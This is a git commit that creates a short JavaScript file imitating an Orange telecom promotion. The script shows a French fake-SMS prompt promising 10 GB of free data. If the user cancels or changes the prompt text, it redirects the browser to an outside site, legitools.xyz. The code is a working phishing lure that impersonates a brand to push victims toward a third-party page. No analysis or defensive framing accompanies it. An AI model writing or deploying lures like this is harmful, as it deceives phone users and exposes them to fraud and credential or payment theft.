bda46360d3dbe41d8f6ba0bac289f5b4376666d1
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-04 01:55:09 -0700

    Create orange-freedata.com.js

---
+++ orange-freedata.com.js
@@ -0,0 +1,5 @@
+var password = '10 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 10 Go de données gratuites en BONUS INDEPENDENCE DAY, veuillez appuyer sur OK pour ACTIVER. ','10 Go de données gratuites');
+if (password != '10 Go de données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
